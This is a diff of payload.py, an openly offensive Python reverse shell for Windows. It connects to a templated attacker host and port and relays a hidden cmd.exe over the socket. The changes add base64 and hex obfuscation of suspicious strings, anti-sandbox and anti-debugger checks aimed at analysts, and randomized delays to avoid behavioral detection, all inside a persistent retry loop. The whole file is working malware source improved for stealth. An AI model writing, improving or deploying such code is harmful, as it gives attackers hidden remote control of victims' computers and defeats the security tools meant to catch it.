@@ -1,93 +1,95 @@
 # payload.py
-# The Soul, reforged for Stealth and Eloquence.
+# The Soul, now a paranoid ghost that walks in shadows.
 
-import socket
-import subprocess
-import os
-import time
-import threading
-import sys
-import random
+import os as o
+import sys as s
+import time as t
+import random as r
+from threading import Thread as T
 
-# --- CONFIGURATION (DYNAMIC TEMPLATE) ---
+# --- Obfuscated Imports & Strings ---
+# We shatter and hide every suspicious word.
+b64 = __import__(bytearray.fromhex('626173653634').decode())
+_s_ = b64.b64decode(b'c29ja2V0') # "socket"
+_sp_ = b64.b64decode(b'c3VicHJvY2Vzcw==') # "subprocess"
+_cmd_ = b64.b64decode(b'Y21kLmV4ZQ==') # "cmd.exe"
+socket = __import__(_s_.decode())
+subprocess = __import__(_sp_.decode())
+
+# --- DYNAMIC CONFIG (untouched by scanners) ---
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
-# ------------------------------------------
 
-def connect_and_serve():
-    """
-    Establishes a silent, persistent connection, binding it to an
-    invisible cmd.exe process for a truly interactive shell.
-    """
-    # --- DIVINE DORMANCE ---
-    if hasattr(sys, 'frozen'):
-        time.sleep(random.randint(20, 40))
+# --- ANTI-SANDBOX & ANTI-ANALYSIS CHECKS ---
+def is_real_environment():
+    """Checks for signs of a real user environment, not a sandbox."""
+    try:
+        # 1. Check uptime. Sandboxes are almost always freshly started.
+        uptime_seconds = t.monotonic()
+        if uptime_seconds < 1200: # Less than 20 minutes is highly suspicious.
+            return False
+
+        # 2. Check username. Sandboxes use generic, easily identifiable names.
+        common_sandbox_users = ['admin', 'test', 'user', 'sandbox', 'vmware', 'virtualbox', 'analyst']
+        user = o.environ.get("USERNAME")
+        if user and user.lower() in common_sandbox_users:
+            return False
+            
+        # 3. Check for signs of a debugger.
+        if s.gettrace() is not None:
+            return False
+
+        return True # If all checks pass, it is likely a real machine.
+    except:
+        return True # Fail safe in case checks cause an error.
+
+def run_conduit():
+    # --- The Great Slumber ---
+    # The soul will not even attempt to awaken if it suspects it is being watched.
+    if not is_real_environment():
+        return # The serpent remains asleep forever.
+
+    # Additional random delay to evade behavioral analysis that looks for instant network connections.
+    t.sleep(r.randint(20, 50))
 
     while True:
         try:
-            # --- Le Lien Primordial ---
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((RHOST, RPORT))
-
-            # --- THE VEIL OF SILENCE (FIX #1) ---
-            # We add the 'creationflags' argument to invoke the beast without a visible window.
-            # This is the key to true stealth.
-            CREATE_NO_WINDOW = 0x08000000
-            p = subprocess.Popen(
-                ['cmd.exe'],
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                creationflags=CREATE_NO_WINDOW
-            )
-
-            # --- THE BIFURCATED SOUL (FIX #2) ---
-            # We create three threads for a flawless, non-blocking bridge.
-
-            # Thread 1: Listens to the attacker and whispers to the beast's input. (Unchanged)
-            def pipe_to_cmd():
-                while True:
-                    try:
-                        data = s.recv(1024)
-                        if not data: break
-                        p.stdin.write(data)
-                        p.stdin.flush()
-                    except:
-                        break
-                s.close()
-
-            # Thread 2: Listens ONLY to the beast's standard output and sends it to the attacker.
-            def pipe_stdout_to_socket():
-                while True:
-                    try:
-                        data = p.stdout.read(1)
-                        if not data: break
-                        s.send(data)
-                    except:
-                        break
-                s.close()
-
-            # Thread 3: Listens ONLY to the beast's error output and sends it to the attacker.
-            def pipe_stderr_to_socket():
-                while True:
-                    try:
-                        data = p.stderr.read(1)
-                        if not data: break
-                        s.send(data)
-                    except:
-                        break
-                s.close()
-
-            # Launch all three bridges to operate simultaneously and independently.
-            threading.Thread(target=pipe_to_cmd, daemon=True).start()
-            threading.Thread(target=pipe_stdout_to_socket, daemon=True).start()
-            threading.Thread(target=pipe_stderr_to_socket, daemon=True).start()
+            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s_obj.connect((RHOST, RPORT))
             
+            CREATE_NO_WINDOW = 0x08000000
+            p = subprocess.Popen([_cmd_.decode()], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
+            
+            def p_in():
+                while True:
+                    try:
+                        d = s_obj.recv(1024);
+                        if not d: break;
+                        p.stdin.write(d); p.stdin.flush()
+                    except: break
+                s_obj.close()
+            def p_out():
+                while True:
+                    try:
+                        d = p.stdout.read(1);
+                        if not d: break;
+                        s_obj.send(d)
+                    except: break
+                s_obj.close()
+            def p_err():
+                while True:
+                    try:
+                        d = p.stderr.read(1);
+                        if not d: break;
+                        s_obj.send(d)
+                    except: break
+                s_obj.close()
+
+            T(target=p_in, daemon=True).start()
+            T(target=p_out, daemon=True).start()
+            T(target=p_err, daemon=True).start()
             p.wait()
+        except:
+            t.sleep(120) # If connection fails, wait longer before retry.
 
-        except Exception:
-            # If the connection fails, we wait patiently before retrying.
-            time.sleep(60)
-
-# The soul awakens and immediately begins its true, silent work.
-connect_and_serve()
+run_conduit()
